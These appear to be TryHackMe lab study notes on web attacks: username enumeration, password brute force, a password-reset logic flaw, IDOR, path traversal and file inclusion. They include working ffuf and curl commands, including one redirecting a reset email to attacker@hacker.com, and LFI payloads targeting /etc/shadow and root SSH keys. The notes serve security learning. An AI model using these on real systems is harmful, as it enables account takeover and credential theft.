# Vulnerability

## Authentication Bypass
### Username Enumeration
```
user@tryhackme$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.217.0/customers/signup -mr "username already exists"
```  
`-w` : usernamelist, `-X` : request method, `-d` : sending data, `FUZZ` : contents from wordlist, `-H` : additonal header, `-u` : target url, `-mr` : the text on the page we are looking for to validate we've found a valid username.  
`> valid_usernames.txt` : add the usernames that you found using ffuf.  

### Brute Force
Password Crack
```
user@tryhackme$ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.217.0/customers/login -fc 200
.
.
.
:: Progress: [355/400] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Error[Status: 302, Size: 0, Words: 1, Lines: 1]
    * W1: steve
    * W2: thunder
```  

### Logic Flaw
A logic flaw is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker.  
<img src="https://github.com/nkn-ctrl/pushtest/blob/main/vul_logicflaw.png" width="500">
```
user@tryhackme$ curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```  

In the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable `$_REQUEST`.  
The PHP `$_REQUEST` variable is an array that contains data received from the query string and POST data.  If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered.

### Cookie Tampering
- Plain Text
- Hashing
    https://crackstation.net/ keep databases of billions of hashes and their original strings.
- Encoding

## IDOR
IDOR stands for Insecure Direct Object Reference and is a type of access control vulnerability.  
### Finding IDORs
- Encode IDs  
    The most common encoding technique on the web is base64 encoding and can usually be pretty easy to spot.  
    - https://www.base64decode.org/
    - https://www.base64encode.org/  

- Hashed IDs  
    Hashed IDs are a little bit more complicated to deal with than encoded ones, but they may follow a predictable pattern, such as being the hashed version of the integer value.  
    - https://crackstation.net/  

- Unpredictable IDs
    If the Id cannot be detected using the above methods, an excellent method of IDOR detection is to create two accounts and swap the Id numbers between them.   

### Where are they located?
he vulnerable endpoint you're targeting may not always be something you see in the address bar.  
    - AJAX request  
    - JavaScript reference  
    - unregerenced parameter  (use during development)
    - as parameter mining

## File Inclusion
Local File Inclusion (LFI), Remote File Inclusion (RFI)  
### Path Traversal
Path traversal vulnerabilities occur when the user's input is passed to a function such as `file_get_contents` in PHP.  
> https://www.php.net/manual/en/function.file-get-contents.php  

Path traversal attacks, also known as the dot-dot-slash attack, then the attacker may send something as `http://webapp.thm/get.php?file=../../../../etc/passwd`  

<p align="center">
  <img src="https://user-images.githubusercontent.com/73976100/219909591-89db95e2-864f-4160-a3be-f95dcbdbe579.png" width="500"/>
</p>

|Location	|Description|
|:---------:|-----------|
|`/etc/issue`|contains a message or system identification to be printed before the login prompt.|
|`/etc/profile`|controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived|
|`/proc/version`|specifies the version of the Linux kernel|
|`/etc/passwd`|has all registered user that has access to a system|
|`/etc/shadow`|contains information about the system's users' passwords|
|`/root`/.bash_history|contains the history commands for `root` user|
|`/var/log/dmessage`|contains global system messages, including the messages that are logged during system startup|
|`/var/mail/root`|all emails for `root` user|
|`/root/.ssh/id_rsa`|Private SSH keys for a root or any known valid user on the server|
|`/var/log/apache2/access.log`|the accessed requests for `Apache`  webserver|
|`C:\boot.ini`|contains the boot options for computers with BIOS firmware|

### Local File Inclusion
LFI attacks against web applications are often due to a developers' lack of security awareness. With PHP, using functions such as `include`, `require`, `include_once`, and `require_once` often contribute to vulnerable web applications.  
- `http://webapp.thm/get.php?file=/etc/passwd`   
- `http://webapp.thm/get.php?file=../../../../etc/passwd`
- `http://webapp.thm/get.php?file=../../../../etc/passwd%00`  
    Using null bytes such as `%00` or `0x00` is an injection technique which the web app into disregarding whatever comes after the Null Byte..    
    NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.  
- `http://webapp.thm/get.php?file=../../../../etc/passwd/.`  
- `....//....//....//....//....//etc/passwd`  
    The web application replaces the `../` with the empty string.  
- ` ?lang=languages/../../../../../etc/passwd`  
    the web application asks to supply input that has to include a directory such as `languages`    

### Remote File Inclusion
Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application.  One requirement for RFI is that the `allow_url_fopen` option needs to be `on`.   
<img src="https://user-images.githubusercontent.com/73976100/219931859-d80f4069-eda1-49e5-b9ed-6ceb82a34dd4.png
" width="700">


<p align="center">
  <img src="https://user-images.githubusercontent.com/73976100/219909591-89db95e2-864f-4160-a3be-f95dcbdbe579.png" width="500"/>
</p>






